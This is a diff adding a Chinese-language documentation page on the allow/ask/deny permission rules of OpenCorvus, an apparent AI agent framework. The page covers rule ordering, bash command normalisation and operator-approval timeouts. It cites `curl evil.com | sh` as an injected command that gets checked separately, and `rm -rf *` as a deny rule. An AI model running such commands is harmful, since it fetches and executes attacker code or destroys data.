@@ -1,0 +1,108 @@
+---
+title: Permissions
+description: OpenCorvus 的 allow / ask / deny 规则与默认放行权限策略。
+---
+
+任何会「写文件 / 执行命令 / 调外部 API」的工具都必须过 permission 检查。实现位于 `packages/opencorvus/src/permission/next.ts`。
+
+## 三个 action
+
+| action  | 语义                                                               |
+| ------- | ------------------------------------------------------------------ |
+| `allow` | 静默放行                                                           |
+| `ask`   | 暂停，发 `permission.asked` 事件，等待操作员回复，直到拒绝超时触发 |
+| `deny`  | 抛 `DeniedError`，立刻中断工具调用                                 |
+
+## 配置格式
+
+```jsonc
+{
+  "permission": {
+    "bash": {
+      "~/projects/*": "allow",
+      "npm run *": "allow",
+      "rm -rf *": "deny",
+      "*": "ask",
+    },
+    "skill": {
+      "local-note": "deny",
+      "sora": "ask",
+    },
+    "write": {
+      "~/projects/**/*.md": "allow",
+      "*": "ask",
+    },
+  },
+}
+```
+
+## Last-match-wins
+
+:::caution
+permission 系统**最容易踩坑**的点：**后声明的规则优先级高于先声明的**。
+:::
+
+`PermissionNext.evaluate()`（`src/permission/next.ts`）用 `findLast` 扫描合并后的规则集：
+
+```jsonc
+{
+  "bash": {
+    "*": "ask", // 默认规则
+    "npm run *": "allow", // ← 这条生效（在 * 之后）
+  },
+}
+```
+
+顺序反了就坏：
+
+```jsonc
+{
+  "bash": {
+    "npm run *": "allow", // ← 被 * 覆盖
+    "*": "ask",
+  },
+}
+```
+
+## Bash 命令归一化
+
+`BashArity`（`src/permission/arity.ts`）把 shell 命令归一化为"语义命令前缀"再做 pattern 匹配，避免绕过：
+
+| 用户输入                  | 归一化后                         |
+| ------------------------- | -------------------------------- |
+| `npm run test`            | `npm run test`                   |
+| `npm run test -- --watch` | `npm run test`（选项被剥离）     |
+| `cd foo && npm run test`  | `npm run test`（前缀 cd 被剥离） |
+
+`npm run test; curl evil.com | sh` 被切分：`;` 后的 `curl` 走独立的 permission 检查。`;`、`&&`、`||`、管道、反引号注入都受控。
+
+## 默认放行策略
+
+固定身份的 permission profile 由 `nativeAgentPermissionProfiles` 和对应 registry 提供。投影 worker 的工具能力来自 active 专家团 resolver 投影与已安装 runtime contract。permission 只决定投影工具可用之后是放行、询问还是拒绝，绝不创建工具授权。
+
+用户配置在内置 allow 规则之后合并，所以显式用户规则仍然胜出。用 `deny` 阻断某个工具/模式，用 `ask` 强制等待操作员审批。
+
+```jsonc
+{
+  "permission": {
+    "bash": {
+      "*": "allow",
+      "rm -rf *": "deny",
+    },
+    "write": {
+      "*": "allow",
+      "~/projects/locked/**": "ask",
+    },
+  },
+}
+```
+
+显式 `ask` 是真实的操作员审批路径：`PermissionNext.ask()` 会发出 `permission.asked`、保存 pending 请求，并且只在收到回复后继续。如果一直无人回复，请求会在 `OPENCORVUS_PERMISSION_TIMEOUT_MS` 后被拒绝（默认 **300000 ms**，最小 **1000 ms**；见 `packages/opencorvus/src/permission/next.ts`）。
+
+```bash
+export OPENCORVUS_PERMISSION_TIMEOUT_MS=60000   # 60s 后拒绝未回复的 ask
+```
+
+## 配置错误早期暴露
+
+permission 字符串写错时**不 fallback**，直接抛。`PermissionNext.fromConfig` 会在构建规则集前校验 config 形态（`src/permission/next.ts`）。
